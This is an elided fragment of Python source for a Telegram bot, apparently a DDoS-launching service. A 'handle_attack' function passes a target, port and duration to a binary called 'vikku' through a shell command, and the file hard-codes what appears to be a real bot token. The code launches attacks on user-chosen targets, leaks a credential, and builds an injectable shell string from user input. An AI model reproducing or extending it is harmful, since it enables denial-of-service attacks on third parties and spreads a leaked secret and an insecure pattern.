...
# ✅ TELEGRAM BOT TOKEN
bot = telebot.TeleBot('7194896344:AAHt1dQpnuO60_DZKxnFUzb11Dp0WEW1iE4')
...
def handle_attack(message):
    ...
    def attack_execution():
        try:
            subprocess.run(f"./vikku {target} {port} {time} 2500", shell=True, check=True, timeout=time_duration)
